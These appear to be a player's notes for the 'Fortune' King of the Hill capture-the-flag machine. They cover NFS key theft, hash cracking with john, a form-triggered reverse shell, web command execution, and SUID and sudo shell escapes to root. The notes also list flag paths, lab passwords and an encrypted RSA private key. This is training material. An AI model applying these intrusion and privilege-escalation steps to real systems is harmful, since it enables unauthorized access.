# Fortune KOTH machine

## footholds

hermes:

- using showmount -e <ip> reveals a share. mounting this with: `mount -t nfs 10.10.241.174:/srv/nfs /tmp/nfs -o nolock` can find a `hermes_ssh` file
- this can be decoded using vignere with key n, then broken with ssh2john, john and rockyou, and will provide ssh access as hermes
  
Note this key and its passphrase is random every time
  
fortuna:
  
- on port 3333 is a service that returns base64. access with nc (curl will also work)
- this is a zip file when decoded, that needs to be cracked
- inside is a creds.txt file that contains fortuna's password
  
  passwords seen: `MzE0NDBlND`, `ZGI4NjI0Mz`
  
  ```
  curl RHOST:3333 | base64 -d > f.zip
  /opt/john/zip2john f.zip > fj
  john --wordlist=rockyou.txt fj
  echo PASS | unzip f.zip
  cat creds.txt
  ```
  
www-data 1:
  
- the website on 80 has an ip and port field. this will on a random change connect back as a reverse shell, if tried multiple times
- as the form fields are randomised, it must be done manually, but is not difficult. 
- connects back as www-data
  
www-data 2:
  
- under port 80 `/_styles` is another website with straight command execution as www-data with the `luck` querystring param
- it has a 1 in 4 chance of running, but will also block any use of the text `nc`
  
## root
  
- there is no root squash on the nfs mount, so you can drop a suid binary in there from attack box
- `ionice /bin/sh -p`
- `/usr/bin/nice /bin/sh -p`
- `xargs -a /dev/null sh -p`
- `python -c 'import pty; pty.spawn("/home/lucky_shell")'` - is random so needs lots of tries
- `fortuna` and `pico`:
  
  ```
  sudo pico
  ^R^X
  reset; s
  ```
- `kairos` and python repl: to get to kairos use suid on find: `find . -exec /bin/sh -p \; -quit`
  ```
  python
  import pty;
  pty.spawn("/bin/bash");
  ```
    
## flags
  
- /media/darts
- /srv/blackjack
- /lib/checkers
- /usr/games/flag
- /usr/local/games/flag
- /geama/flag
  
## hermes key, cuteko pass:

not sure if this random
  
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,57145A8D54A46E26334807885A43DA74

MBpsTtnjX14/G2VnexI+K4WFalKGoTm1/OHobQl+3EPZVY4LU4khWu2JABjv/EXv
cct34TxEu2kw7tYZmdlkosQANLdcLkryRZO8wnQmTmh/nAA9JOOsDNXDYUUteurf
j1UD3XouSNdygA7lDyGJPVqHPbkCOueG27Vryp5660kPpXmyEU7kOMMUpNzncR8r
yd6cQQDSd/ydzAhGpwdXkA4oxdX1qDCWz6Qc7hlMQbAUokGIsqwuRE1smloSwLln
dzTS6eXSq15XSM1Qcs4MVhyY9KX7nWN+8CfUrPRi1+msUlfGyhMacV6kHkl7aAQk
J58RsVKxcpkc8JkOHle//On1ZJ6noTOcSB1czMbhemH3n21FgreSOs8vxUqlX9x7
gVnjEbk7LbFBCObUhVUii3GURlpP1ro4Hv34VvOJl1MKtCOuI0kMyqYjTtFnnVLZ
zBKNoKOlzjM2FTZ2a2ziNAI1OEcO6KZRSPnSGZ0v0ra7GdP9Gj9HHGiIcZbwhex2
+6HGR87WtUWzEG0OCkiR38GhBrJ+byDGYbbAClJu/iun/unTApH7KzZTguOP8ICk
6Pinw3BsKcZbxhAQtjPNhzO/J7c+eMjUtf4yXqz3V0TtjujsluAv05IuTZbjHnCA
un7avtJFRXUVCkPfrEMIN00wOezrNSy2WMF5YzzAuZes4bHbPx2l6neDp6VmfVkg
cK6hZswiEks5MyMLftcLb80fg6hXwy4ZO51Cb4CKEwGU15C1cXG7vglqKlgLscVk
DAg8ySZwwAdffefxhNtiMkxDKu3BWU2onMyjLH7F57DM/gyZm4jGb7RXbvijva/o
PXZCIc0+nWbEAYYV/gG7u09cPWLQmyIaWKaLDxKMXyUW/8nfhIGo2LnACaMIAmZY
bqa9BV1Pkc6zc0hyDqRKa+b71WH5PWXvXETRs2BJcrKyAowiyd1N+EjYi+vzCD6D
gPZXi2wDvEQldNK58NY7IH2Jq1K6+K/6PeRdY2SEp6lQIijBogwFR4AxyNEt/jTe
LEA9ZpJid2sBO+O+SuPDMHfyl/TPQXB0kAAm0GuSmtxqOSrOYX3xPxJ7/+5ioDJZ
TqzNv+uD311ZPuWrKOApc27ZNu7x0Hbd6ATUaqTCkT1eCu4dFPvAROf2DQ8X0Fnx
kui1kvxEc2zU8QqLCizYxZnOLfhF6rtRLfM+zyTA96imlYTtDJMkwgAQU/gxPKuC
PEA6T08FD6TMhJYnjODKmYpYyj21CyKioqmIBR+b4okwYkAQ8WaLZVzCq4C8hoRm
RPCX49MyO6xTdF0mi+2Lsnq+sGJFaeThK5X4J+DGeKmN80cJ7lg0csKmaOTrWX3E
nv/T8D/SDbwybcSj7lISsZAagxaL/dpIIGkP87ZXsRAN57lGZ8gH1n4zMYACH1rt
fNRrsHGlYsqQGvhCtgM9iUZwJALAkqy71XXXy9e+a31QkmG8kRhBiQTex+GZRv6O
gX0bg5csBqJMyJtMNm35GRhoxOmQb0yzKJW/B9uLA3yc/qEOJuu+BjcNx9YrqhoE
h2ZlzchBizy6lU08RI/Py0OGB6YfTWTXM89AENH3sttMI765+CZaypRUBDWDQSrF
-----END RSA PRIVATE KEY-----
```
